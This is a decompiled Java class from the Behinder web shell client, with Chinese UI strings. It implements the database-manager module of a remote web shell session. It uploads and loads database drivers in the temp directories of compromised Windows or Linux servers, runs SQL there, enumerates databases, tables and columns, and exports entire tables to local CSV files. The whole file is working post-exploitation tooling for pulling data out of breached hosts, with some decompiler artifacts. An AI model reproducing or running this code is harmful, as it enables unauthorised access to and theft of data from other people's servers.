 package net.rebeyond.behinder.ui;
 
 import java.io.ByteArrayInputStream;
 import java.io.FileOutputStream;
 import java.net.URI;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.utils.Utils;
 import org.eclipse.swt.custom.TableCursor;
 import org.eclipse.swt.events.MouseEvent;
 import org.eclipse.swt.graphics.Image;
 import org.eclipse.swt.widgets.Display;
 import org.eclipse.swt.widgets.Event;
 import org.eclipse.swt.widgets.FileDialog;
 import org.eclipse.swt.widgets.Label;
 import org.eclipse.swt.widgets.Listener;
 import org.eclipse.swt.widgets.Menu;
 import org.eclipse.swt.widgets.MenuItem;
 import org.eclipse.swt.widgets.MessageBox;
 import org.eclipse.swt.widgets.Table;
 import org.eclipse.swt.widgets.TableColumn;
 import org.eclipse.swt.widgets.TableItem;
 import org.eclipse.swt.widgets.Text;
 import org.eclipse.swt.widgets.Tree;
 import org.eclipse.swt.widgets.TreeItem;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
 
 
 
 
 
 
 
 
 
 
 
 
 public class DBManagerUtils
 {
   private ShellService currentShellService;
   private Label statusLabel;
   private Text sqlTxt;
   
   public DBManagerUtils(ShellService shellService, Label statusLabel, Text sqlTxt)
   {
     this.currentShellService = shellService;
     this.statusLabel = statusLabel;
     this.sqlTxt = sqlTxt;
   }
   
   private void loadDriver(final String type, String scheme) throws Exception
   {
     String driverPath = "net/rebeyond/behinder/resource/driver/";
     Display.getDefault().syncExec(new Runnable() {
       public void run() {
         if (DBManagerUtils.this.statusLabel.isDisposed())
           return;
         DBManagerUtils.this.statusLabel.setText("正在上传数据库驱动……");
       }
     });
     String os = this.currentShellService.shellEntity.getString("os").toLowerCase();
     
     String remoteDir = os.indexOf("windows") >= 0 ? "c:/windows/temp/" : "/tmp/";
     String libName = null;
     if (type.equals("jsp")) {
       if (scheme.equals("sqlserver")) {
         libName = "sqljdbc41.jar";
       } else if (scheme.equals("mysql")) {
         libName = "mysql-connector-java-5.1.36.jar";
       } else if (scheme.equals("oracle")) {
         libName = "ojdbc5.jar";
       }
     } else if (type.equals("aspx")) {
       if (scheme.equals("mysql")) {
         libName = "mysql.data.dll";
       } else if (scheme.equals("oracle")) {
         libName = "Oracle.ManagedDataAccess.dll";
       }
     }
     
     byte[] driverFileContent = Utils.getResourceData(driverPath + libName);
     String remotePath = remoteDir + libName;
     this.currentShellService.uploadFile(remotePath, driverFileContent, true);
     Display.getDefault().syncExec(new Runnable() {
       public void run() {
         if (DBManagerUtils.this.statusLabel.isDisposed())
           return;
         DBManagerUtils.this.statusLabel.setText("驱动上传成功，正在加载驱动……");
       }
     });
     JSONObject loadRes = this.currentShellService.loadJar(remotePath);
     if (loadRes.getString("status").equals("fail"))
     {
       throw new Exception("驱动加载失败:" + loadRes.getString("msg"));
     }
     Display.getDefault().syncExec(new Runnable() {
       public void run() {
         if (DBManagerUtils.this.statusLabel.isDisposed())
           return;
         if (type.equals("jsp"))
           DBManagerUtils.this.statusLabel.setText("驱动加载成功，请再次点击“连接”。");
         DBManagerUtils.this.statusLabel.setText("驱动加载成功。");
       }
     });
   }
   
   private String executeSQL(Table table, Map<String, String> connParams, final String sql) throws Exception {
     Display.getDefault().syncExec(new Runnable() {
       public void run() {
         if (DBManagerUtils.this.statusLabel.isDisposed())
           return;
         DBManagerUtils.this.sqlTxt.setText(sql);
         DBManagerUtils.this.statusLabel.setText("正在查询，请稍后……");
       }
       
     });
     String type = (String)connParams.get("type");
     String host = (String)connParams.get("host");
     String port = (String)connParams.get("port");
     String user = (String)connParams.get("user");
     String pass = (String)connParams.get("pass");
     String database = (String)connParams.get("database");
     JSONObject resultObj = this.currentShellService.execSQL(type, host, port, user, pass, database, sql);
     final String status = resultObj.getString("status");
     final String msg = resultObj.getString("msg");
     Display.getDefault().syncExec(new Runnable() {
       public void run() {
         if (DBManagerUtils.this.statusLabel.isDisposed())
           return;
         if (status.equals("success")) {
           DBManagerUtils.this.statusLabel.setText("查询完成。");
         } else if ((status.equals("fail")) && (!msg.equals("NoDriver"))) {
           DBManagerUtils.this.statusLabel.setText("查询失败:" + msg);
         }
         
       }
     });
     return msg;
   }
   
 
   public void querySQL(String url, Tree tree, final Table table, final String sql)
   {
     try
     {
       final Map<String, String> connParams = parseConnURI(url);
       new Thread() {
         public void run() {
           try {
             final String resultText = DBManagerUtils.this.executeSQL(table, connParams, sql);
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (DBManagerUtils.this.statusLabel.isDisposed())
                   return;
                 try {
                   DBManagerUtils.this.fillTable(this.val$table, resultText);
                 }
                 catch (Exception e) {
                   DBManagerUtils.this.statusLabel.setText(e.getMessage());
                 }
               }
             });
           }
           catch (Exception e1) {
             e1.printStackTrace();
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (DBManagerUtils.this.statusLabel.isDisposed())
                   return;
                 if (e1.getMessage() != null) {
                   DBManagerUtils.this.statusLabel.setText(e1.getMessage());
                 }
               }
             });
           }
         }
       }.start();
     }
     catch (Exception ex)
     {
       this.statusLabel.setText(ex.getMessage());
     }
   }
   
   private static Map<String, String> parseConnURI(String url) throws Exception
   {
     Map<String, String> connParams = new HashMap();
     URI connUrl = new URI(url);
     String type = connUrl.getScheme();
     String host = connUrl.getHost();
     String port = connUrl.getPort();
     String authority = connUrl.getUserInfo();
     String user = authority.substring(0, authority.indexOf(":"));
     String pass = authority.substring(authority.indexOf(":") + 1);
     String database = connUrl.getPath().replaceFirst("/", "");
     String coding = "UTF-8";
     if ((connUrl.getQuery() != null) && (connUrl.getQuery().indexOf("coding=") >= 0)) {
       coding = connUrl.getQuery();
       Pattern p = Pattern.compile("([a-zA-Z]*)=([a-zA-Z0-9\\-]*)");
       Matcher m = p.matcher(connUrl.getQuery());
       while (m.find()) {
         String key = m.group(1).toLowerCase();
         if (key.equals("coding"))
           coding = m.group(2).trim();
       }
     }
     connParams.put("type", type);
     connParams.put("host", host);
     connParams.put("port", port);
     connParams.put("user", user);
     connParams.put("pass", pass);
     connParams.put("database", database);
     connParams.put("coding", coding);
     return connParams;
   }
   
   public void showDatabases(String url, final Tree tree, final Table table) throws Exception
   {
     tree.removeAll();
     
     final String shellType = this.currentShellService.shellEntity.getString("type");
     final Map<String, String> connParams = parseConnURI(url);
     String databaseType = ((String)connParams.get("type")).toLowerCase();
     String sql = null;
     if (databaseType.equals("mysql")) {
       sql = "show databases";
     } else if (databaseType.equals("sqlserver")) {
       sql = "SELECT name FROM  master..sysdatabases";
     } else if (databaseType.equals("oracle"))
     {
       sql = "select sys_context('userenv','db_name') as db_name from dual";
     }
     final String finalSql = sql;
     new Thread()
     {
       public void run() {
         try {
           if (shellType.equals("aspx"))
           {
 
 
             DBManagerUtils.this.loadDriver("aspx", "mysql");
             DBManagerUtils.this.loadDriver("aspx", "oracle");
           }
           
           final String resultText = DBManagerUtils.this.executeSQL(table, connParams, finalSql);
           if (resultText.equals("NoDriver")) {
             DBManagerUtils.this.loadDriver(shellType, (String)connParams.get("type"));
             return;
           }
           Display.getDefault().syncExec(new Runnable() {
             public void run() {
               if (DBManagerUtils.this.statusLabel.isDisposed())
                 return;
               try {
                 DBManagerUtils.this.fillTable(this.val$table, resultText);
                 JSONArray result = new JSONArray(resultText);
                 int databaseNums = result.length() - 1;
                 for (int i = 1; i <= databaseNums; i++) {
                   JSONArray row = result.getJSONArray(i);
                   TreeItem t = new TreeItem(this.val$tree, 0);
                   t.setData("type", "database");
                   t.setImage(new Image(this.val$table.getDisplay(), new ByteArrayInputStream(
                     Utils.getResourceData("net/rebeyond/behinder/resource/database.png"))));
                   t.setText(row.get(0).toString());
                 }
               } catch (Exception e) {
                 DBManagerUtils.this.statusLabel.setText(e.getMessage());
               }
               
             }
             
           });
         }
         catch (Exception e)
         {
           if (e.getMessage() != null) {
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (DBManagerUtils.this.statusLabel.isDisposed())
                   return;
                 DBManagerUtils.this.statusLabel.setText(e.getMessage());
               }
             });
           }
         }
       }
     }.start();
   }
   
   public void showTables(String url, final TreeItem currentNode, final Table table)
   {
     try
     {
       currentNode.removeAll();
       
 
 
       String databaseName = currentNode.getText();
       
       final Map<String, String> connParams = parseConnURI(url);
       String sql = null;
       String databaseType = (String)connParams.get("type");
       if (databaseType.equals("mysql")) {
         sql = String.format(
           "select table_name,a.* from information_schema.tables as a where table_schema='%s' and table_type='base table'", new Object[] {
           databaseName });
       } else if (databaseType.equals("sqlserver")) {
         sql = String.format("select name,* from %s..sysobjects  where xtype='U'", new Object[] { databaseName });
       } else if (databaseType.equals("oracle"))
         sql = "select table_name,num_rows from user_tables";
       final String finalSql = sql;
       new Thread() {
         public void run() {
           try {
             final String resultText = DBManagerUtils.this.executeSQL(table, connParams, finalSql);
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (DBManagerUtils.this.statusLabel.isDisposed())
                   return;
                 try {
                   DBManagerUtils.this.fillTable(this.val$table, resultText);
                   JSONArray result = new JSONArray(resultText);
                   int tableNums = result.length() - 1;
                   for (int i = 1; i <= tableNums; i++) {
                     JSONArray row = result.getJSONArray(i);
                     TreeItem t = new TreeItem(this.val$currentNode, 0);
                     t.setData("type", "table");
                     t.setImage(new Image(this.val$table.getDisplay(), 
                       new ByteArrayInputStream(Utils.getResourceData(
                       "net/rebeyond/behinder/resource/database_table.png"))));
                     t.setText(row.get(0).toString());
                   }
                   this.val$currentNode.setExpanded(true);
                 }
                 catch (Exception e) {
                   e.printStackTrace();
                   if (e.getMessage() != null) {
                     DBManagerUtils.this.statusLabel.setText(e.getMessage());
                   }
                 }
               }
             });
           }
           catch (Exception e) {
             DBManagerUtils.this.statusLabel.setText(e.getMessage());
           }
         }
       }.start();
     }
     catch (Exception ex)
     {
       this.statusLabel.setText(ex.getMessage());
     }
   }
   
   public void showColumns(String url, TreeItem currentNode, Table table) {
     try {
       currentNode.removeAll();
       
 
 
       String tableName = currentNode.getText();
       String databaseName = currentNode.getParentItem().getText();
       
       Map<String, String> connParams = parseConnURI(url);
       String sql = null;
       String databaseType = (String)connParams.get("type");
       if (databaseType.equals("mysql")) {
         sql = String.format(
           "select COLUMN_NAME,a.* from information_schema.columns as a where table_schema='%s' and table_name='%s'", new Object[] {
           databaseName, tableName });
       } else if (databaseType.equals("sqlserver")) {
         sql = String.format("SELECT Name,* FROM %s..SysColumns WHERE id=Object_Id('%s')", new Object[] { databaseName, 
           tableName });
       } else if (databaseType.equals("oracle"))
         sql = String.format("select COLUMN_NAME,a.* from user_tab_columns a where Table_Name='%s' ", new Object[] { tableName });
       String resultText = executeSQL(table, connParams, sql);
       fillTable(table, resultText);
       
       JSONArray result = new JSONArray(resultText);
       int tableNums = result.length() - 1;
       for (int i = 1; i <= tableNums; i++) {
         JSONArray row = result.getJSONArray(i);
         TreeItem t = new TreeItem(currentNode, 0);
         t.setData("type", "column");
         t.setImage(new Image(table.getDisplay(), new ByteArrayInputStream(
           Utils.getResourceData("net/rebeyond/behinder/resource/database_column.png"))));
         t.setText(row.get(0).toString());
       }
     } catch (Exception ex) {
       this.statusLabel.setText(ex.getMessage());
     }
   }
   
   private void fillTable(Table table, String resultText) throws Exception {
     table.removeAll();
     TableColumn[] arrayOfTableColumn; int j = (arrayOfTableColumn = table.getColumns()).length; for (int i = 0; i < j; i++) { TableColumn c = arrayOfTableColumn[i];
       c.dispose();
     }
     try
     {
       result = new JSONArray(resultText);
     } catch (Exception e) { JSONArray result;
       throw new Exception(resultText); }
     JSONArray result;
     if (!result.get(0).getClass().toString().equals("class org.json.JSONArray"))
       return;
     JSONArray fieldArray = result.getJSONArray(0);
     int rows = result.length() - 1;
     int cols = fieldArray.length();
     
     for (Object field : fieldArray) {
       String fieldName = ((JSONObject)field).get("name").toString();
       TableColumn tableColumn = new TableColumn(table, 131072);
       tableColumn.setText(fieldName);
       
       tableColumn.setMoveable(true);
     }
     
 
     table.setHeaderVisible(true);
     table.setLinesVisible(true);
     for (int i = 1; i <= rows; i++) {
       JSONArray row = result.getJSONArray(i);
       TableItem item = new TableItem(table, 0);
       String[] rowData = new String[row.length()];
       List<String> rowList = new ArrayList();
       for (Object o : row.toList()) {
         if (o == null)
           o = "null";
         rowList.add(o.toString());
       }
       rowList.toArray(rowData);
       item.setText(rowData);
     }
     table.setRedraw(false);
     for (int i = 0; i < cols; i++) {
       table.getColumn(i).pack();
     }
     table.setRedraw(true);
     showTableContextMenu(table);
   }
   
   private void showTableContextMenu(final Table table)
   {
     final TableCursor cursor = new TableCursor(table, 0);
     
     Menu menu = new Menu(cursor);
     MenuItem item = new MenuItem(menu, 8);
     item.setText("复制单元格");
     cursor.setMenu(menu);
     item.addListener(13, new Listener()
     {
       public void handleEvent(Event event) {
         String cellContent = cursor.getRow().getText(cursor.getColumn());
         Utils.setClipboardString(cellContent);
       }
     });
     item = new MenuItem(menu, 8);
     item.setText("复制整行");
     cursor.setMenu(menu);
     item.addListener(13, new Listener()
     {
       public void handleEvent(Event event) {
         String lineContent = "";
         for (int i = 0; i < table.getColumnCount(); i++)
         {
           lineContent = lineContent + cursor.getRow().getText(i) + "|";
         }
         Utils.setClipboardString(lineContent);
       }
     });
     item = new MenuItem(menu, 8);
     item.setText("导出全部查询结果");
     cursor.setMenu(menu);
     item.addListener(13, new Listener()
     {
       public void handleEvent(Event event) {
         FileDialog filedlg = new FileDialog(table.getShell(), 4096);
         
         filedlg.setText("请选择保存路径");
         
         filedlg.setFilterPath(".");
         
         filedlg.setFileName("query_export.csv");
         
         final String selected = filedlg.open();
         if ((selected == null) || (selected.equals("")))
           return;
         final StringBuilder sb = new StringBuilder();
         for (int i = 0; i < table.getColumnCount(); i++)
         {
           sb.append(table.getColumn(i).getText() + ",");
         }
         sb.append("\n");
         TableItem[] arrayOfTableItem; int j = (arrayOfTableItem = table.getItems()).length; for (int i = 0; i < j; i++) { TableItem item = arrayOfTableItem[i];
           
           for (int i = 0; i < table.getColumnCount(); i++)
           {
             sb.append(item.getText(i) + ",");
           }
           sb.append("\n");
         }
         DBManagerUtils.this.statusLabel.setText("正在写入文件……" + selected);
         new Thread()
         {
           public void run()
           {
             try {
               FileOutputStream fso = new FileOutputStream(selected);
               fso.write(sb.toString().getBytes());
               fso.flush();
               fso.close();
               Display.getDefault().syncExec(new Runnable() {
                 public void run() {
                   if (DBManagerUtils.this.statusLabel.isDisposed())
                     return;
                   DBManagerUtils.this.statusLabel.setText("导出完成，文件已保存至" + this.val$selected);
                 }
               });
             }
             catch (Exception e) {
               e.printStackTrace();
               if (e.getMessage() != null) {
                 Display.getDefault().syncExec(new Runnable() {
                   public void run() {
                     if (DBManagerUtils.this.statusLabel.isDisposed())
                       return;
                     DBManagerUtils.this.statusLabel.setText(e.getMessage());
                   }
                 });
               }
             }
           }
         }.start();
       }
     });
   }
   
   public void showContextMenu(MouseEvent e, String connUrl, final Tree dataTree, final Table dataTable) throws Exception
   {
     if (e.button == 3) {
       final TreeItem currentNode = dataTree.getSelection()[0];
       if (currentNode.getData("type").equals("table")) {
         final Map<String, String> connParams = parseConnURI(connUrl);
         final String databaseType = (String)connParams.get("type");
         
         Menu menu = new Menu(dataTree);
         dataTree.setMenu(menu);
         MenuItem openItem = new MenuItem(menu, 8);
         openItem.setText("查询前10条");
         openItem.addListener(13, new Listener()
         {
           public void handleEvent(Event arg0)
           {
             final String tableName = currentNode.getText();
             final String dataBaseName = currentNode.getParentItem().getText();
             new Thread() {
               public void run() {
                 try {
                   String sql = null;
                   if (this.val$databaseType.equals("mysql")) {
                     sql = String.format("select * from %s.%s limit 10", new Object[] { dataBaseName, tableName });
                   } else if (this.val$databaseType.equals("sqlserver")) {
                     sql = String.format("select top 10 * from %s..%s", new Object[] { dataBaseName, tableName });
                   } else if (this.val$databaseType.equals("oracle")) {
                     sql = String.format("select * from %s where rownum<=10", new Object[] { tableName });
                   }
                   final String resultText = DBManagerUtils.this.executeSQL(this.val$dataTable, this.val$connParams, sql);
                   Display.getDefault().syncExec(new Runnable() {
                     public void run() {
                       if (DBManagerUtils.this.statusLabel.isDisposed())
                         return;
                       try {
                         DBManagerUtils.this.fillTable(this.val$dataTable, resultText);
                       }
                       catch (Exception e) {
                         DBManagerUtils.this.statusLabel.setText(e.getMessage());
                       }
                     }
                   });
                 }
                 catch (Exception e)
                 {
                   if (e.getMessage() != null) {
                     Display.getDefault().syncExec(new Runnable() {
                       public void run() {
                         if (DBManagerUtils.this.statusLabel.isDisposed())
                           return;
                         DBManagerUtils.this.statusLabel.setText(e.getMessage());
                       }
                       
                     });
                   }
                 }
               }
             }.start();
           }
         });
         MenuItem openAllItem = new MenuItem(menu, 8);
         openAllItem.setText("查询全部");
         openAllItem.addListener(13, new Listener()
         {
           public void handleEvent(Event arg0)
           {
             final String tableName = currentNode.getText();
             final String dataBaseName = currentNode.getParentItem().getText();
             MessageBox dialog = new MessageBox(dataTree.getShell(), 196);
             dialog.setText("确认");
             dialog.setMessage("查询所有记录可能耗时较长，确定查询所有记录？");
             if (dialog.open() == 128) {
               return;
             }
             
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
             new Thread()
             {
               public void run()
               {
                 try
                 {
                   String sql = null;
                   if (this.val$databaseType.equals("mysql")) {
                     sql = String.format("select * from %s.%s", new Object[] { dataBaseName, tableName });
                   } else if (this.val$databaseType.equals("sqlserver")) {
                     sql = String.format("select * from %s..%s", new Object[] { dataBaseName, tableName });
                   } else if (this.val$databaseType.equals("oracle")) {
                     sql = String.format("select * from %s", new Object[] { tableName });
                   }
                   final String resultText = DBManagerUtils.this.executeSQL(this.val$dataTable, this.val$connParams, sql);
                   Display.getDefault().syncExec(new Runnable() {
                     public void run() {
                       if (DBManagerUtils.this.statusLabel.isDisposed())
                         return;
                       try {
                         DBManagerUtils.this.fillTable(this.val$dataTable, resultText);
                       }
                       catch (Exception e) {
                         DBManagerUtils.this.statusLabel.setText(e.getMessage());
                       }
                     }
                   });
                 }
                 catch (Exception e) {
                   if (e.getMessage() != null) {
                     Display.getDefault().syncExec(new Runnable() {
                       public void run() {
                         if (DBManagerUtils.this.statusLabel.isDisposed())
                           return;
                         DBManagerUtils.this.statusLabel.setText(e.getMessage());
                       }
                       
                     });
                   }
                 }
               }
             }.start();
           }
         });
         MenuItem exportItem = new MenuItem(menu, 8);
         exportItem.setText("导出当前表");
         exportItem.addListener(13, new Listener()
         {
 
           public void handleEvent(Event arg0)
           {
             final String tableName = currentNode.getText();
             final String dataBaseName = currentNode.getParentItem().getText();
             
             FileDialog filedlg = new FileDialog(dataTree.getShell(), 4096);
             
             filedlg.setText("请选择保存路径");
             
             filedlg.setFilterPath(".");
             filedlg.setFileName("export_table.csv");
             
             final String selected = filedlg.open();
             if ((selected == null) || (selected.equals(""))) {
               return;
             }
             
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
             new Thread()
             {
               public void run()
               {
                 try
                 {
                   String sql = null;
                   
                   if (this.val$databaseType.equals("mysql")) {
                     sql = String.format("select * from %s.%s", new Object[] { dataBaseName, tableName });
                   } else if (this.val$databaseType.equals("sqlserver")) {
                     sql = String.format("select * from %s..%s", new Object[] { dataBaseName, tableName });
                   } else if (this.val$databaseType.equals("oracle")) {
                     sql = String.format("select * from %s", new Object[] { tableName });
                   }
                   String resultText = DBManagerUtils.this.executeSQL(this.val$dataTable, this.val$connParams, sql);
                   StringBuilder rows = new StringBuilder();
                   JSONArray arr = new JSONArray(resultText);
                   String colsLine = "";
                   JSONArray cols = arr.getJSONArray(0);
                   for (int i = 0; i < cols.length(); i++)
                   {
                     JSONObject colObj = cols.getJSONObject(i);
                     colsLine = colsLine + colObj.getString("name") + ",";
                   }
                   rows.append(colsLine + "\n");
                   for (int i = 1; i < arr.length(); i++)
                   {
                     JSONArray cells = arr.getJSONArray(i);
                     for (int j = 0; j < cells.length(); j++)
                     {
                       rows.append(cells.get(j) + ",");
                     }
                     rows.append("\n");
                   }
                   
                   FileOutputStream fso = new FileOutputStream(selected);
                   fso.write(rows.toString().getBytes());
                   fso.flush();
                   fso.close();
                   Display.getDefault().syncExec(new Runnable() {
                     public void run() {
                       if (DBManagerUtils.this.statusLabel.isDisposed())
                         return;
                       DBManagerUtils.this.statusLabel.setText("导出完成，文件已保存至" + this.val$selected);
                     }
                   });
                 }
                 catch (Exception e) {
                   e.printStackTrace();
                   if (e.getMessage() != null) {
                     Display.getDefault().syncExec(new Runnable() {
                       public void run() {
                         if (DBManagerUtils.this.statusLabel.isDisposed())
                           return;
                         DBManagerUtils.this.statusLabel.setText(e.getMessage());
                       }
                     });
                   }
                 }
               }
             }.start();
           }
         });
       }
     }
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/ui/DBManagerUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */